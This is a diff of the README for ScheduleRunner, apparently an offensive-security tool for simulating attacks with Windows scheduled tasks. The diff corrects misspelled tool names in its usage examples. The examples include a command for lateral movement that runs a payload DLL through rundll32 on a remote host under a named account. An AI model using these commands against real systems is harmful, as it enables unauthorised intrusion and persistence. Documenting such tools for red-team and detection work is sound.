@@ -90,27 +90,27 @@ A number of C# tools were already developed to simulate the attack using schedul
 
 **Delete a scheduled task called "Cleanup"**
 
-`cheduleRunner.exe /method:delete /taskname:Cleanup`
+`ScheduleRunner.exe /method:delete /taskname:Cleanup`
 
 **Execute a scheduled task called "Cleanup"**
 
-`cheduleRunner.exe /method:run /taskname:Cleanup`
+`ScheduleRunner.exe /method:run /taskname:Cleanup`
 
 **Query details for a scheduled task called "Cleanup" under "\Microsoft\Windows\CertificateServicesClient" folder on a remote server**
 
-`heduleRunner.exe /method:query /taskname:Cleanup /folder:\Microsoft\Windows\CertificateServicesClient /remoteserver:TARGET-PC01`
+`ScheduleRunner.exe /method:query /taskname:Cleanup /folder:\Microsoft\Windows\CertificateServicesClient /remoteserver:TARGET-PC01`
 
 **Query all scheduled tasks under a specific folder "\Microsoft\Windows\CertificateServicesClient" on a remote server**
 
-`cheduleRunner.exe /method:query /folder:\Microsoft\Windows\CertificateServicesClient /remoteserver:TARGET-PC01`
+`ScheduleRunner.exe /method:query /folder:\Microsoft\Windows\CertificateServicesClient /remoteserver:TARGET-PC01`
 
 **Query all sub-folders in scheduled task**
 
-`cheduleRunner.exe /method:queryfolders`
+`ScheduleRunner.exe /method:queryfolders`
 
 **Perform lateral movement using scheduled task to a remote server using a specific user account**
 
-`cheduleRunner.exe /method:move /taskname:Demo /remoteserver:TARGET-PC01 /program:rundll32.exe /argument:c:\temp\payload.dll /user:netero1010`
+`ScheduleRunner.exe /method:move /taskname:Demo /remoteserver:TARGET-PC01 /program:rundll32.exe /argument:c:\temp\payload.dll /user:netero1010`
 
 ### Library and Reference Used:
 |  Library | Link  |
